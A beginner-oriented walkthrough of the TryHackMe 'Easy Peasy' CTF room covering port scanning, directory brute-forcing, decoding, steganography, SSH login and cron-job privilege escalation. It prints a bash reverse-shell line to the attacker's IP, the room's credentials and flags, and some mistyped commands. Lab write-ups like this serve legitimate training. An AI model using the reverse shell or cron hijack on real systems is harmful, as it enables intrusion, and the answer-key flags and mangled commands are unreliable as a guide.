# Easy Peasy CTF

# 🧠 **Easy Peasy CTF — Full Annotated Solution (Beginner‑friendly)**

> This is the room walkthrough from start to finish — with explanations of what we do, why we do it, and how it works.
> 

---

## 🧩 **Step 0 — Setup and Concepts**

Before you begin:

🎯 **Goal:**

Find all flags and evade into the machine and eventually get *root*.

📍 **You need:**

- TryHackMe account
- AttackBox or local Linux (Kali) terminal
- Target VM deployed and **IP address visible**
- Browser (inside AttackBox)

---

## 🕵️‍♂️ **Step 1 — Port Scan (discover services)**

### 🛠 Command:

```bash
nmap -A -p- <IP>

```

### 📌 What it does:

- `nmap`: port scanner tool
- `p-`: scan *all* 65535 TCP ports (not just the default 1000)
- `A`: perform **aggressive scan** — version detection, OS hinting, script scans

👉 This tells you *which services* are running and where to look next. [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

### 🔍 Why it matters:

Services are entry points. If a service responds, you can interact with it (like HTTP, SSH, etc.). [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

Typical output shows:

```
80/tcp    open  http     (nginx)
6498/tcp  open  ssh      (OpenSSH)
65524/tcp open  http     (Apache)

```

This means:

- Port **80** → Web page (nginx)
- Port **6498** → SSH login
- Port **65524** → Second website (Apache) [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 🗂️ **Step 2 — Web Enumeration (discover hidden web paths)**

### 🛠 Command:

```bash
gobusterdir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

```

### 📌 What it does:

- `gobuster`: brute‑forces directories/files on a webserver using a wordlist
- `u`: target URL
- `w`: tells gobuster *which list of names to try*

👉 It tries many thousands of possible directory names and reports which exist. [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 📍 **Step 3 — Flag #1 via Hidden Directory**

1. From the Gobuster result, a directory `/hidden` is found.
2. Enter:
    
    ```
    http://<IP>/hidden
    
    ```
    
3. Then check:
    
    ```
    http://<IP>/hidden/whatever
    
    ```
    
4. View source (`Ctrl+U` in the browser). You’ll find a hidden text like:
    
    ```
    <p hidden>encoded_string_here</p>
    
    ```
    

### 🔍 Decoding:

Often a string like this is Base‑**62** encoded (like Base64 but with more characters). Use **CyberChef**:

🧪 In CyberChef:

- Paste the encoded string
- Choose **From Base62**
- Output → flag

Example output:

```
flag{f1rs7_fl4g}

```

**This is Flag #1.** [Medium](https://medium.com/%40ezeprecious.uche/tryhackme-easy-peasy-ctf-walkthrough-77cd7a11c4cb)

---

## 📁 **Step 4 — Find Flag #2 (Apache robots.txt)**

⚠️ Check the second web server:

```
http://<IP>:65524/robots.txt

```

Inside you may see a strange user‑agent line, not just normal disallow rules.

Example like:

```
User‑Agent:a___(something)___0

```

That *string is a hash*! [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

### 🔍 Crack the hash:

Use an online tool or `hash‑identifier` first to guess hash type, then a cracker like *md5hashing.net*. That gives you:

ps: [https://www.boxentriq.com/analysis/cipher-identifier](https://www.boxentriq.com/analysis/cipher-identifier) that works too 

[https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250)

```
flag{1m_s3c0nd_fl4g}

```

**Flag #2!** [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 📄 **Step 5 — Flag #3 from Apache Home Page**

Open the root of the Apache page:

```
http://<IP>:65524

```

You’ll see some HTML code. Look for anything *flag{…}* or something hidden.

**You’ll find Flag #3 here.** [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 🧬 **Step 6 — Hidden Binary + Steganography (Finding SSH Credentials)**

On the Apache site, you might find a directory or image like:

```
binarycodepixabay.jpg

```

Check the HTML source for either:

- A hash next to it
- Or hidden encoded text

Download the image.

### 🛠 Extract hidden data:

```bash
steghide extract -sf binarycodepixabay.jpg

```

It will ask:

```
Enter password:

```

That is the hash you saw earlier. Once entered, it outputs:

```
secrettext.txt

```

Inside:

```
username: boring
password: <binarystring>

```

---

## 🔍 **What is the binary password?**

That long string of zeros and ones is binary (ASCII code for letters).

### Decode:

Use CyberChef:

- Paste the binary
- Choose **From Binary**
- Output → readable password

That gives:

```
iconvertedmypasswordtobinary

```

Now you have real credentials! [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 🔐 **Step 7 — SSH Into the Machine**

Use SSH with the credentials:

```bash
ssh boring@<IP> -p 6498

```

- `ssh`: secure shell client
- `boring@`: username
- `p 6498`: non‑standard port

Once in, list files:

```
ls

```

Open:

```
cat user.txt

```

It might look *encoded* again (ROT13), so decode it with:

- CyberChef → **ROT13**

You get:

```
flag{n0wits33msn0rm4l}

```

**This is the user flag.** [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 📈 **Step 8 — Privilege Escalation (Getting Root)**

Now we want *root access*.

### 🧰 Enumerate for weak configs:

A common tool: **linPEAS**

(This is optional but very helpful.)

Steps:

```
scp -P 6498 linpeas.sh boring@<IP>:/tmp/
ssh boring@<IP> -p 6498
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

```

This scans the system and looks for weak points. [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 🛠 **Find and Edit Cron Job**

Look for suspicious cron jobs:

```
cat /etc/crontab

```

If you find a script owned by root but editable by you:

```
nano /var/www/.mysecretcronjob.sh

```

Add a **reverse shell payload**:

```bash
bash -i >& /dev/tcp/<YourIP>/4444 0>&1

```

On your AttackBox:

```
nc-nlvp4444

```

When cron runs, you get a reverse shell as root. [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

## 🏁 **Final — Get Root Flag**

Once in root shell:

```
cat /root/root.txt

```

🎉 **You’ve got the root flag!** [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

---

# 🗺️ **Decision Flowchart (Basic Map)**

```
Start
  |
nmap → Find open ports (80,6498,65524)
  |
Web enumeration (gobuster) → /hidden
  |
Hiddendir → decode → Flag#1
  |
Apache robots.txt → crack hash → Flag#2
  |
Apache home → findhidden flag → Flag#3
  |
Download image + hash → steghide → credentials
  |
SSH → user.txt → Flag (ROT13 decoding)
  |
Privilege Escalation → cronjob edit → root shell
  |
root.txt

```

---

# 🧰 **Tools Summary & Why We Use Them**

| Tool | What it does | Why we use it |
| --- | --- | --- |
| `nmap` | Port/service discovery | See what’s open & running |
| `gobuster` | Finds hidden web paths | Reveals directories like `/hidden` |
| CyberChef | Decode/transform data | Decode encodings (Base62, binary, ROT13) |
| `steghide` | Extract hidden content in images | Gets hidden credentials |
| SSH | Remote login access | Enter the machine |
| `linPEAS` | Privilege escalation helper | Finds misconfigurations |
| `netcat (nc)` | Networking listener | Catch reverse shells |

---

## 🏁 Final Notes

✔ This room is a *full‑cycle beginner CTF* — you practice web enumeration, decoding, steganography, SSH, and privilege escalation. [404 On The Floor](https://www.404onthefloor.com/writeups/2025/10/23/thm-easy-peasy-ctf.html?utm_source=chatgpt.com)

✔ Don’t skip understanding *why each command is run* — that’s the real learning.

✔ You can ask for clarifications on any step anytime!